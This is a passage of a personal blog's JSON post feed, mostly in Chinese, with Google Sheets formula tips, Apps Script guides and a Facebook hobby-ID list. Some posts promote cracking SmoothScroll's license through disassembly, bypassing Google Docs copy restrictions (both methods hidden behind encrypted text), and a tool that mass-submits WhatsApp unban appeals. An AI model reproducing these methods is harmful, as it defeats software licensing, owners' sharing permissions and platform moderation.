例如要在一个表格里面大量的创建表格，备份数据，就需要手动一个一个的去操作，那么使用 Google 脚本就可以自动化的操作，节省大量的时间。也可以设置定时任务，每天按照设置的时间自动化运行。当然目前只是举了一些例子，Google 脚本还有更多的功能。 常见类型 绑定 Google 应用 网络应用 绑定 Google 应用 绑定到对应的 Google 应用，例如文档、表格、云端、日历、表单等等。在 Google 应用内点击扩展程序，选择 Apps 脚本，这样就创建好绑定 Google 应用的脚本了。如果从其它渠道创建 Google 脚本就不会绑定 Google 应用。 网络应用 Google 脚本可以发布为 Web 网络应用，并且通过浏览器来访问，就像用户访问网页一样，并且可以操作 Google 应用，例如修改文档、表格等等。绑定 Google 应用的脚本可以转换为网络应用。网络应用必须包含 doGet() 或者 doPost()，相当于 HTTP GET 和 HTTP POST。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本介绍","feature":"https://dev-coco.github.io/post-images/Google-Script-Introduce.jpg","link":"https://dev-coco.github.io/post/Google-Script-Introduce/","stats":{"text":"2 min read","time":66000,"words":312,"minutes":2},"date":"2022-06-25 12:13:57","dateFormat":"2022-06-25"},{"content":"SmoothScroll 是一款为非苹果原装鼠标滚轮提供平滑滚动的工具。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 官网地址：https://www.smoothscroll.net/mac/ 软件有免费 21 天的试用期，过了试用期后仍然可以使用，不过会一直收到购买许可证的提示。官方一年订阅的价格是 $11.98 美元。 把 SmoothScroll 的主程序拖到 Hopper Disassembler 里进行逆向分析。 请输入密码后查看 下面是成功激活的截图： var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"eec0cf7b9c84ea80ee113e8eb7f9b96f5fdbdf686d93b2877f6551f441786e7d4455cc9a4f7a9ba160f5929ec90160442e3330563aa8abb848ee4b7e5f08ac3fVSQ+9yy0HtOhDhK8MxgGPv8ODQ34fdoEB7yVJKMYAZqDB4+ENa6IsuBDoGHOJ8a8IurdeZ08TNDM0BnBIGK+M3U7i84+zSJGlt5+zF0nkL/v5f2LmWr0ntYBK8jqfWYhGdlHo5bowa12QyufZaKMD34mU3MF86wumtHVq1jnvxZj5nc3VXwYK5Vb8rpOnBzt86JCviZPFfowNkAnt8+FDtGevvUEsQMY15FxuJ9YyttVLNb5OIArv13JOzjSJYQyik4wMBF2Q0+G5DN6X2BiYznLVxnu2J3qCZvfR72JcjN8OOcVLIT/cN9rvxbkds45iIKO3qqFwHjnLN8EBFKuhHcmanBmd0hdvKWHTs4XJCGRKd2Ok3mZUenQuiK5HC5ino4SK/L9DRcuIlbAKhK9LwcOjZdt1xCvZCu0UzYmAEe8ZoPRnhyN0j2n6V7EcPpi55KiClUBsvfGW7Bv10H3g0QEX9hodF2b0Mm94IIit/3mBlqkXVh1cW8EwEDJw/Xh58ABjxQMPceSl5S9H0yVMnMt4UXBuCKA5/Ltj/zqBb0yg/GXrInh3GkK+wluEzERXstPY4EL/dlGq4jP7YLqLw==\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h}) ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"SmoothScroll 免费激活码","feature":"","link":"https://dev-coco.github.io/post/SmoothScroll-Free-License/","stats":{"text":"2 min read","time":103000,"words":325,"minutes":2},"date":"2022-06-22 17:55:03","dateFormat":"2022-06-22"},{"content":"再也不怕被修改表格名称，跨表获取不到数据啦！ 使用 IMPORTRANGE 函数跨表引用数据的时候，有时候会遇到表格名称被修改，导致提示 #REF! 错误。因为 IMPORTRANGE 函数的参数是文本类型，所以无法根据表格名称的变化而正确的获取到最新的表格名称。 解决方法 建立一个辅助表，然后分表引用一个单元格，例如：='工作表1'!A1。 使用下面的公式可以从引用的单元格识别出单元格的名称。 =IF(TODAY() &lt; TRUE, REGEXREPLACE(FORMULATEXT(A1), &quot;...$|[=']&quot;, &quot;&quot;)) 先来拆分出来理解一下这个公式运行的过程。 首先运行的是 FORMULATEXT(A1)，使用 FORMULATEXT 函数以文本的格式输出单元格内的公式。 使用 REGEXREPLACE 函数对表格名称以外的字符进行替换，正则表达式 语法 …$|[=']，获取 = 和 ' 符号，还有末尾三位的 !A1，然后替换成空值。这样就得到了表格名称。 虽然现在已经获取到了表格名称，但是还不完善，现在获取到的数据是静态的，也就是说当修改了分表的名称的时候，公式并不会更新表格的名称，需要再次编辑单元格才会更新。 使用易失函数达到动态更新的效果，因为使用易失函数后，在表格内修改任意一个单元格后，会引起所有相关公式重新计算。 使用 TODAY 函数做一个判断，例如 TODAY() &lt; TRUE，返回值是 TRUE，因为布尔型的值要比其它 数据类型 都要大。 用 IF 函数做一个判断，判断结果为 TRUE，返回获取表格名称的公式，这样在修改表格的时候，就会更新表格的名称了。 最后使用 IMPORTRANGE 跨表引用辅助表里面的表格名称，即使在分表修改了名称，也会同步更新。 =IMPORTRANGE(&quot;SheetID&quot;, IMPORTRANGE(&quot;SheetID&quot;, &quot;辅助表!B1&quot;)&amp;&quot;!A:A&quot;) ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 动态获取表格名称","feature":"https://dev-coco.github.io/post-images/Dynamic-Sheet-Name.png","link":"https://dev-coco.github.io/post/Dynamic-Sheet-Name/","stats":{"text":"2 min read","time":112000,"words":524,"minutes":2},"date":"2022-06-19 20:38:27","dateFormat":"2022-06-19"},{"content":"A submission tool to unbanned WhatsApp accounts in batch and quickly. Open Source: https://github.com/dev-coco/WhatsApp-Batch-Unbanned-Tool Configuration code.gs /** * 设置存储数据的表格 * TODO: 需要放入表格 ID */ const sheet = SpreadsheetApp.openById('Input Sheet ID') // 存放剩余次数，表格默认命名为 Data const getSheetData = sheet.getSheetByName('Data').getRange('A1') // 存放解封结果，表格默认命名为 Result const getResultSheet = sheet.getSheetByName('Result') Replace the &quot;Input Sheet ID&quot; with the Google sheet ID. Two spreadsheet are needed, one named Data to storage the remaining counts and the other named Result to storage the successful unbanned information. The template variable in the unBlockTemplate function puts in the content that needs to be unbanned by writing a letter and puts in the phone variable, which supports ES6 features. Example: /** * @description 随机生成写信的模板 * @param {string} phone - 写信模版 * @returns {string} 生成好的模板 */ function unBlockTemplate (phone) { // TODO: 需要设置写信的模版，并且放入 phone 变量 const template = [ 'Hello!\\nXXXXXXXX. My number: ' + phone, `XXXXXXXX. My WhatsApp: ${phone}` ] // 生成随机数 const index = Math.floor((Math.random() * template.length)) return template[index] } In the sendEmail function, need to replace &quot;Input Email Title&quot; with the title of the email you need to write and unbanned. /** * 发送邮件 * TODO: 需要设置发送邮件的标题 */ MailApp.sendEmail('support@support.whatsapp.com', 'Input Email Title', unBlockTemplate(phone)) index.html In the CSS body style, the background image is from rawpixel Premium User: Link, License. If you are not a rawpixel Premium user, please replace the image yourself to avoid copyright issues. body { /* Image from rawpixel premium Please follow the license: https://www.rawpixel.com/services/licenses */ background: url(&quot;https://dev-coco.github.io/images/Project/image-from-rawpixel-id-2042508-jpeg.jpg&quot;); height: 100vh; width: 100vw; position: relative; background-size: cover; background-repeat: no-repeat; display: grid; justify-items: center; align-items: center; } Google Sheet Create a Google Sheet, click Extensions in the menu bar, and select Apps Script. Put the code inside the code.gs. Then click (➕) the plus sign to create a new HTML file. Name the file index and put the code from index.html file. Click Deplay in the upper right corner and select New deployment. Once the deployment is complete, it is ready to use. Trigger Select Trigger on the left. Click Add Trigger in the lower right corner. Choose which function to run, here select resetData. Select hour interval, I would recommended to set it to every hour. How's work The unbanned tool sends an email to WhatsApp with the number submitted and records the number of uses remaining. When WhatsApp finishes reviewing the number, a receipt will be sent to the mailbox, and if it is successfully unbanned, it records the number in a Google Sheet. When the unbanned tool checks the status of the number, it will check if there is a successfully unbanned number in the Google Sheet. How to use Enter the WhatsApp number, one per line, in the format: +[area code]XXXXXXX, like +1234567890, and click Send. WhatsApp will probably process the submission within 24 hours. Due to Google Mail usage limits, only 100 messages can be sent a day. Enter the number and click &quot;query&quot;. If it shows &quot;已解封&quot;, it means the account is back to normal and you can login and use it, if it shows &quot;未解封&quot;, it means WhatsApp still banned this account. ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"WhatsApp","slug":"whatsapp","used":true,"link":"https://dev-coco.github.io/tag/whatsapp/"}],"title":"WhatsApp batch recover banned","feature":"https://dev-coco.github.io/post-images/WhatAapp-Batch-Recover-Banned.png","link":"https://dev-coco.github.io/post/WhatAapp-Batch-Recover-Banned/","stats":{"text":"4 min read","time":218000,"words":631,"minutes":4},"date":"2022-06-14 20:20:38","dateFormat":"2022-06-14"},{"content":"一个批量快速解封 WhatsApp 账号的提交工具。 开源代码：https://github.com/dev-coco/WhatsApp-Batch-Unbanned-Tool 配置 code.gs /** * 设置存储数据的表格 * TODO: 需要放入表格 ID */ const sheet = SpreadsheetApp.openById('Input Sheet ID') // 存放剩余次数，表格默认命名为 Data const getSheetData = sheet.getSheetByName('Data').getRange('A1') // 存放解封结果，表格默认命名为 Result const getResultSheet = sheet.getSheetByName('Result') 需要将替换 “Input Sheet ID” 替换成 Google 表格的 ID。需要用到两个工作表，一个命名为 Data，用来存放剩余次数，另外一个命名为 Result，用来存放成功解封的信息。 在 unBlockTemplate 函数中的 template 变量放入需要写信解封的内容，并且放入 phone 变量，支持 ES6 写法。例子： /** * @description 随机生成写信的模板 * @param {string} phone - 写信模版 * @returns {string} 生成好的模板 */ function unBlockTemplate (phone) { // TODO: 需要设置写信的模版，并且放入 phone 变量 const template = [ 'Hello!\\nXXXXXXXX. My number: ' + phone, `XXXXXXXX. My WhatsApp: ${phone}` ] // 生成随机数 const index = Math.floor((Math.random() * template.length)) return template[index] } 在 sendEmail 函数中需要将 “Input Email Title” 替换成需要写信解封的邮件标题。 /** * 发送邮件 * TODO: 需要设置发送邮件的标题 */ MailApp.sendEmail('support@support.whatsapp.com', 'Input Email Title', unBlockTemplate(phone)) index.html 在 CSS 的 body 样式中，background 设置的图片来源于 rawpixel 高级用户：链接，许可证。 如果你不是 rawpixel 高级用户，请自行替换图片，避免出现版权问题。 body { /* Image from rawpixel premium Please follow the license: https://www.rawpixel.com/services/licenses */ background: url(&quot;https://dev-coco.github.io/images/Project/image-from-rawpixel-id-2042508-jpeg.jpg&quot;); height: 100vh; width: 100vw; position: relative; background-size: cover; background-repeat: no-repeat; display: grid; justify-items: center; align-items: center; } Google 表格 创建一个 Google 表格，在菜单栏点击扩展程序，选择 Apps 脚本。 在 代码.gs 中放入 code.gs 文件内的代码。然后点击 (➕) 加号，新建一个 HTML 文件。 文件名字命名为 index，再放入 index.html 文件内的代码。 点击右上角的部署，再选择新建部署。 点击齿轮 (⚙️)，选择 Web 应用。 部署完成后就可以正常使用了。 定时任务 在左侧选择触发器。 在右下角点击添加触发器。 选择要运行的功能，这里选择 resetData，选择间隔小时数，建议设置为每小时。 程序原理 解封工具提交号码会通过邮箱给 WhatsApp 发送邮件，并且记录剩余的使用次数。当 WhatsApp 审核完成后会发送回执到邮箱，如果成功解封会记录号码到 Google 表格。解封工具查询号码状态的时候，会从表格里面查询是否存在成功解封的号码。 使用方法 输入 WhatsApp 号码，一行一个，格式：+区号XXXXXX，点击发送。提交后 WhatsApp 大概会在 24 小时内处理。由于 Google Mail 的限制，一天只允许发送 100 封邮件。 输入号码，点击查询。如果显示“已解封”代表账号已经恢复正常，可以登录使用了，如果显示未解封代表无法解封。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"WhatsApp","slug":"whatsapp","used":true,"link":"https://dev-coco.github.io/tag/whatsapp/"}],"title":"WhatsApp 批量解封提交工具","feature":"https://dev-coco.github.io/post-images/WhatsApp-Batch-Unbanned-Tool.png","link":"https://dev-coco.github.io/post/WhatsApp-Batch-Unbanned-Tool/","stats":{"text":"4 min read","time":186000,"words":775,"minutes":4},"date":"2022-06-14 20:20:25","dateFormat":"2022-06-14"},{"content":"使用 Google Excel 函数获取 WhatsApp 群组的名称和头像。 获取群组名称 =INDEX(IMPORTXML(A1, &quot;//h3&quot;), 2) 原理分析 先分析网页源码，定位群组名称使用的 HTML 标签和位置。在第二个 h3 标签显示的是群组的名称。 使用 IMPORTXML 函数，用 XPath 语法 //h3 获取网页的 h3 标题。 因为预期的结果是第二个，需要使用 INDEX 函数，获取第二行的内容。 获取群组头像 =IMAGE(INDEX(IMPORTXML(A1, &quot;//img/@src&quot;), 3)) 原理分析 使用 IMPORTXML 函数，用 XPath 语法 //img/@src 获取网页所有 img 标签的 src 属性。 第三行的链接是群组的头像，需要使用 INDEX 函数，获取第三行的内容。 最后再使用 IMAGE 函数显示图片。 ","tags":[{"name":"WhatsApp","slug":"whatsapp","used":true,"link":"https://dev-coco.github.io/tag/whatsapp/"},{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel WhatsApp 相关","feature":"https://dev-coco.github.io/post-images/Google-Excel-About-WhatsApp.jpg","link":"https://dev-coco.github.io/post/Google-Excel-About-WhatsApp/","stats":{"text":"1 min read","time":45000,"words":198,"minutes":1},"date":"2022-06-13 16:16:52","dateFormat":"2022-06-13"},{"content":"从列表中随机获取其中一个值。 列表随机取值 =INDEX(A:A, RANDBETWEEN(1, COUNTA(A:A))) 原理分析 先使用 COUNTA 函数将 A 列的内容进行记数，计算有多少的单元格。 再使用 RANDBETWEEN 函数生成随机数，因为 RANDBETWEEN 属于易失函数，在表格内修改任意一个单元格会引起所有公式重新计算，这样每次都可以随机的生成值。A 列的内容是从第一行开始的，那么最小值就是 1，最大值放入刚才 COUNTA 计算的值，刚好对应的就是第 10 行。使用 COUNTA 函数的好处是可以让数据变成动态的，在 A 列添加内容，COUNTA 函数会自动计算出 A 列的所有单元格的数量，如果用的是静态的数值，那么 A 列要添加或者删减内容的时候，就需要再次调整参数。 使用 INDEX 根据行偏移获取指定的内容。根据 A 列的内容获取偏移行的内容，将刚才写好的公式作为偏移的行数，这样就可以实现从列表中随机取一个值了。 列表根据条件随机取值 在 B 列中随机取值，并且 A 列包含文具。 公式 =INDEX(FILTER(B:B, A:A = &quot;文具&quot;), RANDBETWEEN(1, COUNTIF(A:A, &quot;文具&quot;))) 原理分析 使用 COUNTIF 计算 A 列包含文具的单元格数量。 再使用 RANDBETWEEN 函数生成随机数，放入刚才 COUNTIF 计算的内容。 使用 FILTER 函数筛选出在 A 列包含文具对应的 B 列的内容。 最后使用 INDEX 函数计算偏移函数，将 FILTER 函数计算结果作为 INDEX 函数搜索的内容，再把 RANDBETWEEN 函数计算的结果作为偏移的行数。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 列表随机取值","feature":"https://dev-coco.github.io/post-images/Google-Excel-Random-Value.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Random-Value/","stats":{"text":"2 min read","time":100000,"words":460,"minutes":2},"date":"2022-06-07 18:29:29","dateFormat":"2022-06-07"},{"content":"绕过限制，复制受保护的 Google 文档或者表格。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 当 Google 文档或者表格在“与他人共享”设置里面，取消了查看者和评论者可以看到下载、打印和复制选项这个权限。 那么在正常情况下，是无法复制里面的内容，一复制就会出现下图的提示。 运行下面的代码，如果运行一次不行，再运行一次就可以复制里面的内容了。以下的方法同时兼容 Google 文档和表格。 请输入密码后查看 效果如下： var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"5033050f6ed020b8d5908c84774c30f67fb9f1fe661fe9cc23b4df952b1bc82195801c23ae0405d59052a9f5706304a9bc328cae2c8483c53692273e583516495yXr1vFdhSKTu+W5Aas+wdQXHNYjHW+t633rcagVj0Xq2zeRQMfYGUB/PfydqbCD4i959A6cYW7JHRNvZoat2CpTlLlSI36nPCocD3CQ7fdjSXv2J2+SFJXTyfNgq4jcsdsXeg9O2OJ7YbQIFZnVYQCC2AKr4rZ3Wyp2L8l4rmd0VchACk8Hm4x7JVCfpiD22DgaiBvnQVtp2BinoM+sWT58l+9Y9MxteDMOvAQeavoUdPdYDNW46xI2O7uD6/pp1QInKs8J2p6k9/xpk4/gvi7W8uo3rfDdTj8vPzGvTRJnMzBVIHpHTPfxDNjiUelB6AENRzDNRkM/mOumNGCzVS3KTyYjsi4HFcrXTH3UGEy0Y5Y3AMhEHfr+uUL5QOevxwFIx7SIZTxYV6QnoZw066JqRYVUjdMAb2SKJNbNy76M8nSNsZIiHk9e3e6epIKRYgO4Mg3SR9rMTgrC6qDlINKWgMB5yikpqdNwquLJ5hngWycfstXk4xx0V3uqQeRXL5+WzZc0t19cU2X2JNSabizr9FV2gqzLWFEQ9L8e90YPFLTFKFDvryTXPOfi8h37SuXvJ2fbPT1UK49dgE4SgYkRwcfXu+dJGW0B6I7vOKjwW7m4GcjPyV4WU7/BPoMLqtz+0Jh1k58SZYvW10BkWc4pjeM1tlt9bqONSuJp2T2RAIwHA9RzJp0PTGzpqoi4idAF1kNGveqK6wT34RlMbeWuRCy1A4lVVceag98mNG9RUe+klusLQzhtcxSIJgvwNLD2dHco39deRG7AMgsV2M1uwR9AyZqdiYpONH1tKb4M2iCPRBb9sH0CGudjQVUId8GtoaTvbOwoCAsC9Zvfja140gJtOhZWxEbRyCcjcWYEBCKR5NvuML2S3Xv/6bWMqbdoXXExoy++JAChBFa9cRajaIy+OxBKE3YOghNdPBEZ7oVZvBJxlleWkexmbTKKAi1c2V68t96KR1OxUk7Ok6GAgw1Lnh0GF18rKZN9+8c=\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h})","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"},{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"复制受保护的 Google 文档或表格","feature":"","link":"https://dev-coco.github.io/post/Copy-Protected-Document-Or-Sheet/","stats":{"text":"2 min read","time":109000,"words":360,"minutes":2},"date":"2022-06-01 12:17:26","dateFormat":"2022-06-01"},{"content":"Mac 电脑无需 HDMI 线，无线连接扩展显示器。 两个设备都需要登录 iCloud 账号，并且开启以下选项。 系统偏好设置 &gt; 共享 &gt; 隔空播放接收器 打开 系统偏好设置 &gt; 显示器 然后在显示器中会看到左下角多了一个添加显示器的选项，选择扩展的显示器。 选择扩展的显示器后，可能会听不到声音，因为有可能会自动改变默认的声音输入和输出。在音频 MIDI 设置里调整。 在显示器中拖动扩展显示器的位置。 显示器设置中可以调整主显示器和扩展显示器的分辨率 全部设置好后，就可以把主显示器中的窗口拖动到扩展显示器中显示了。 ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"使用隔空播放实现双屏显示器","feature":"","link":"https://dev-coco.github.io/post/AirPlay-For-Dual-Monitors/","stats":{"text":"1 min read","time":43000,"words":213,"minutes":1},"date":"2022-05-27 11:41:50","dateFormat":"2022-05-27"},{"content":"Facebook 爱好名称和 ID 列表。 序号 图标 名称 ID 1 ☕ 咖啡烘焙 2003583223089019 2 ☕ 咖啡拉花 2033257976738750 3 ♿ 轮椅竞速 2254256301265670 4 ⚽ 室内五人制足球 2271948502837927 5 ⚽ 桌上足球 2225637600822505 6 ⚽ 足球 1910006509077880 7 ⚽ 盲人足球 2512609928809451 8 ⚾ 棒球 2377832135578546 9 ⚾ 梦幻棒球 2023950034318144 10 ⚾ 垒球 2024557460962423 11 ⛰️ 徒步 2076211102437780 12 ⛰️ 自行车越野 2204618039558428 13 ⛰️ 全地形车骑行 2432368450171092 14 ⛰️ 无障碍徒步 2038851872898193 15 ⛳ 飞盘高尔夫 2078069475619314 16 ⛵ 模型船舶 2046932002017462 17 ⛵ 陆地风帆 1990899887695872 18 ⛵ 航行 2159009590817464 19 ⛷ 滑雪 2553134164698515 20 ⛷ 跳台滑雪 2182426965110360 21 ⛷ 高山滑雪 1937264569692097 22 ⛷ 北欧滑雪 2492727804077742 23 ⛷ 自由式滑雪 1691299514309067 24 ⛷ 越野滑雪 2044617848927805 25 ⛷ 残疾人北欧滑雪 1994367010639247 26 ⛷ 冬季两项 1972075252905854 27 ⛷ 残疾人冬季两项 2008733425910588 28 ⛸️ 速度滑冰 2026126060808260 29 ✂️ 手工艺 3146818998665343 30 ✂️ 花边工艺 1801906166605114 31 ✂️ 针绣 2878241722201391 32 ✂️ 缝纫 1916835788413048 33 ✈️ 飞机摄影 2509037849136677 34 ✈️ 跳伞 1925195667562798 35 ✏️ 讽刺画 1937548029634233 36 ✏️ 素描 1988751654494021 37 ✏️ 人体素描 2286883608049237 38 ✏️ 画画 2160258004013648 39 ❄️ 雪地摩托车赛 1921723711210489 40 ❓ 竞猜游戏 2397291026952523 41 🀄 麻将 2468668986507256 42 🃏 解谜 2178141345583155 43 🃏 克里比奇纸牌 2191290677569844 44 🃏 牌类游戏 1470164203086198 45 🃏 魔术 2035178213195009 46 🃏 扑克魔术 1778202965618870 47 🌅 低空跳伞 1984823034934822 48 🌊 冲浪 2488690287824493 49 🌊 趴板冲浪 2380755325328652 50 🌊 浅滩冲浪 2317469101658233 51 🌊 风筝冲浪 1692457740859944 52 🌊 单桨冲浪 1967874026661591 53 🌊 水中有氧运动 2206424259368830 54 🌊 水上滑板 2134628389893392 55 🌊 残疾人铁人三项 2121245314580747 56 🌊 水球 2420507677978690 57 🌊 漂流 1942854875800063 58 🌊 无障碍漂流 2379531582117590 59 🌊 潜水 2504889582885222 60 🌏 旅游 2584324448259404 61 🌏 观光 2147882348630473 62 🌐 学语言 2488123681204843 63 🌱 园艺 1870132589779230 64 🌱 盆景 2200262559985887 65 🌼 种植花卉 2379429208766064 66 🌿 永续农业 1924774600903328 67 🌿 室内园艺 2359332130746866 68 🍄 野外觅食 2116788545052467 69 🍄 真菌和地衣 1942491279121787 70 🍔 烧烤 2062006813920669 71 🍕️ 美食 2292097517518172 72 🍜︎ 吃货 3112848472066070 73 🍞 面包制作 2206825052695609 74 🍪 饼干裱花 1955735454541811 75 🍭 糖果糕点 2339748922767175 76 🍭 糖艺 2333473940059764 77 🍳 烹饪 2430032780358701 78 🍴 美食探店 2364898450247793 79 🎂 蛋糕制作与裱花 1952957581453837 80 🎈 热气球飞行 2048042358608860 81 🎒 背包旅行 2561882120503774 82 🎛️ 自动修音 1990581514312653 83 🎢 坐过山车 2595736453830130 84 🎢 游主题公园 2234336696648142 85 🎣 钓鱼 1935872569841204 86 🎣 飞钓 2316913458320069 87 🎣 深海垂钓 1961069907312297 88 🎤 唱歌 1994489570638083 89 🎤 节奏口技 2292372074171096 90 🎧 听音乐 1537282433041260 91 🎧 音频制作 1965912176818234 92 🎧 音频母带处理 2147785268606062 93 🎨 串珠 2420417034654083 94 🎨 绘画 1989619357787681 95 🎨 静物画 2194971720567609 96 🎨 风景画 1936840209744834 97 🎨 锡蜡铸造 2497593223601133 98 🎨 镶嵌艺术 2466019953468055 99 🎨 艺术 1959934617426648 100 🎨 肖像艺术 2635827056458240 101 🎨 玻璃艺术 1943862372372138 102 🎨 篮筐编织 1643808975719208 103 🎨 纺纱 1694907180614998 104 🎨 细密画 1973139152774839 105 🎨 编织 1940292522719089 106 🎨 网板印染 1813337675431320 107 🎨 丙烯画 2200496136641007 108 🎨 拼贴画 2006555312743279 109 🎨 水彩画 2018802218201240 110 🎨 油画 2018754711504139 111 🎨 版画 1904919482956378 112 🎩 服装设计 2350002131739453 113 🎬 电影制作 1835644379835671 114 🎭 真人角色扮演游戏 2467159669971901 115 🎭 音乐剧 1941579739266051 116 🎭 哑剧表演 1960331760719136 117 🎭 表演 1962420533849959 118 🎭 戏剧表演 1917985558257393 119 🎭 表演艺术 2197619303624229 120 🎭 即兴喜剧表演 1974889069267281 121 🎭 喜剧 2056119724431646 122 🎭 戏剧 1697974940309052 123 🎭 木偶戏 1782782941851111 124 🎭 舞台艺术 2308910479184400 125 🎭 单口喜剧 1889479054496457 126 🎮 电子游戏 1609563305811014 127 🎮 VR/AR 游戏 1938641942857904 128 🎯 软弹气枪 2547127331994779 129 🎯 飞镖 2542869772406672 130 🎯 激光枪战 1847812721996245 131 🎲 角色扮演游戏 2116054845107631 132 🎵 芭蕾舞 2198371223520539 133 🎵 雷击顿音乐 2351405151590545 134 🎵 音乐制作 1955584951216295 135 🎵 音乐表演 2475141322503041 136 🎵 舞蹈 2110103119046545 137 🎵 竞技舞蹈 2348254055216892 138 🎵 高地舞 2151129398308642 139 🎵 阿根廷探戈 2284704801589655 140 🎵 苏格兰乡村舞 2072944289452008 141 🎵 草裙舞 2139268586127065 142 🎵 莫里斯舞 2161905613859443 143 🎵 萨尔萨舞 2184224081664221 144 🎵 行列舞 2175755632540419 145 🎵 西非舞 2593250277415486 146 🎵 维也纳华尔兹 2253928384722618 147 🎵 现代舞 2199501596768996 148 🎵 电子舞曲制作 2350470731634046 149 🎵 波莱罗舞 2226218244137432 150 🎵 爱尔兰舞 2238053259617057 151 🎶 音乐节 2998098680216052 152 🎶 长笛 2009463792514682 153 🎶 街舞 2559735497399791 154 🎶 约德尔唱法 2091654220891851 155 🎶 竖琴 2756349717740270 156 🎷 萨克斯风 2188945217859106 157 🎷 爵士舞 1131609506963196 158 🎸 弹吉他 2265683673451968 159 🎸 贝斯 2176049765795716 160 🎹 钢琴演奏 2023161544394436 161 🎾 网球 1935370933207868 162 🎾 轮椅网球 2553927411344338 163 🏀 篮球 1935469196573005 164 🏀 梦幻篮球 1528940630542511 165 🏀 轮椅篮球 2528025727269507 166 🏀 篮网球 2010779572331592 167 🏁 大脚车 1608119049288776 168 🏁 越野赛车 2035797763130324 169 🏂 单板滑雪 1792083090896807 170 🏅 宠物竞技 2150136631691752 171 🏅 铁人三项 1837552879675784 172 🏅 锻炼 1980929228661335 173 🏆 轮滑德比 2375536895821291 174 🏆 爱尔兰式曲棍球和橄榄球 2469061229802244 175 🏇 骑马 1902140643234007 176 🏈 梦幻足球 2151161454935094 177 🏈 美式橄榄球 2039981876045253 178 🏉 轮椅橄榄球 1998695256850498 179 🏉 英式橄榄球 2095658203788025 180 🏍️ 越野摩托车障碍赛 1995835533836431 181 🏍️ 摩托车越野赛 2039228522803226 182 🏍️ 小轮车竞赛 (BMX) 1985476698236330 183 🏍️ 摩托车公路赛 893713734086221 184 🏍️ 摩托车场地赛 2864111840281351 185 🏍️ 耐力赛 1821147891346566 186 🏎️ 赛车 2079925788741206 187 🏎️ 梦幻赛车 2115365971817963 188 🏎️ 场地拉力赛 2102351423163587 189 🏎️ 拉力赛 2083133505081743 190 🏎️ 卡丁车 1786167354826142 191 🏎️ 肥皂盒车赛 1972718032844752 192 🏐 排球 1979021352187391 193 🏐 沙滩排球 2039440216145017 194 🏐 坐式排球 2446801558724863 195 🏐 躲避球 2430032087014112 196 🏑 草地曲棍球 1946553875422073 197 🏑 冰上扫帚球 1988889114563019 198 🏑 地板球 1929894147107436 199 🏔 攀登 2074714672549389 200 🏔 登山 2792341260791506 201 🏔 登山 1865155570263767 202 🏔 溪降 2223420277702832 203 🏔 抱石 1960019950749330 204 🏔 攀冰岩 1615890298512631 205 🏔 竞技攀登 1714568848648578 206 🏔 传统攀登 1929991177084040 207 🏔 无障碍（残疾人）攀岩 1846276645501797 208 🏕️ 露营 2080956075288534 209 🏙️ 房地产投资 1805064629616281 210 🏡 玩具屋 2452926634724438 211 🏸 羽毛球 2058437427583280 212 🏸 羽毛球 1999871593466414 213 🏹 无障碍（残疾人）箭术 2034751796560634 214 🏹 狩猎 2137539819619103 215 🏹 无障碍狩猎 2044048762342914 216 🏺️ 雕刻 